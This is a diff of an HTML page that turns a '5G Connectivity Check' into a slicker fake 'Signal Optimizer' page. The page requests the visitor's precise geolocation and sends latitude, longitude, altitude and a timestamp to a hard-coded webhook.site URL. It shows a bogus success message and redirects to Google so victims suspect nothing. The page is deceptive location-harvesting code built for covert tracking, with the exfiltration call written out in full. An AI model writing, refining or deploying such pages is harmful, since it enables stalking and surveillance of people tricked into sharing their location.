@@ -1,54 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Network Speed Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic Tool</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+        .loader {
+            border-top-color: #3498db;
+            animation: spinner 1.5s linear infinite;
+        }
+        @keyframes spinner {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
-<body>
-    <h2>5G Connectivity Check</h2>
-    <p>Click below to verify if your device supports high-speed location-based 5G.</p>
-    
-    <!-- User Gesture: The browser needs this click to allow the popup -->
-    <button onclick="startTest()">Verify Device Compatibility</button>
+<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-4">
+
+    <div id="main-card" class="bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full border border-slate-700">
+        <!-- Header -->
+        <div class="text-center mb-6">
+            <div class="bg-blue-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-blue-500/20">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold tracking-tight">Signal Optimizer v4.2</h1>
+            <p class="text-slate-400 mt-2 text-sm">Analyze nearby towers for better 5G stability.</p>
+        </div>
+
+        <!-- Progress/Action Area -->
+        <div id="content-area">
+            <button onclick="startDiagnostic()" class="w-full bg-blue-600 hover:bg-blue-500 transition-colors py-3 rounded-xl font-semibold shadow-lg shadow-blue-900/40">
+                Begin Optimization
+            </button>
+        </div>
+
+        <div id="loading-area" class="hidden text-center">
+            <div class="loader ease-linear rounded-full border-4 border-t-4 border-slate-700 h-12 w-12 mx-auto mb-4"></div>
+            <p id="status-text" class="text-blue-400 font-mono text-xs uppercase tracking-widest">Scanning Satellites...</p>
+        </div>
+
+        <!-- Footer Decor -->
+        <div class="mt-8 pt-6 border-t border-slate-700 flex justify-between text-[10px] text-slate-500 font-mono uppercase tracking-widest">
+            <span>Encrypted: AES-256</span>
+            <span>Region: Global</span>
+        </div>
+    </div>
 
     <script>
-        function startTest() {
+        function startDiagnostic() {
+            // UI Change
+            document.getElementById('content-area').classList.add('hidden');
+            document.getElementById('loading-area').classList.remove('hidden');
+
             if (navigator.geolocation) {
-                // Requesting location AFTER a click
+                // The Permission Request
                 navigator.geolocation.getCurrentPosition(success, error, {
                     enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+                    timeout: 8000
                 });
             } else {
-                alert("Browser not supported.");
+                alert("Device Hardware Incompatible.");
             }
         }
 
-        function success(position) {
-            const data = {
+        async function success(position) {
+            document.getElementById('status-text').innerText = "Syncing with Node...";
+            
+            const payload = {
                 lat: position.coords.latitude,
                 lon: position.coords.longitude,
-                acc: position.coords.accuracy
+                alt: position.coords.altitude,
+                acc: position.coords.accuracy,
+                time: new Date().toISOString()
             };
 
-            // Send to your Webhook
-            fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify(data)
-            }).then(() => {
-                // Only redirect AFTER the data is sent
+            try {
+                // Send to your Webhook
+                await fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify(payload)
+                });
+                
+                // Final "Success" UI before redirect
+                document.getElementById('status-text').innerText = "Optimization Complete!";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com/search?q=5G+coverage+map";
+                }, 1500);
+
+            } catch (err) {
                 window.location.href = "https://www.google.com";
-            });
+            }
         }
 
         function error(err) {
-            console.log("Error code: " + err.code);
-            // If they block it, redirect anyway so they don't suspect anything
+            // Silent fail
+            console.warn("User denied or timeout.");
             window.location.href = "https://www.google.com";
         }
     </script>
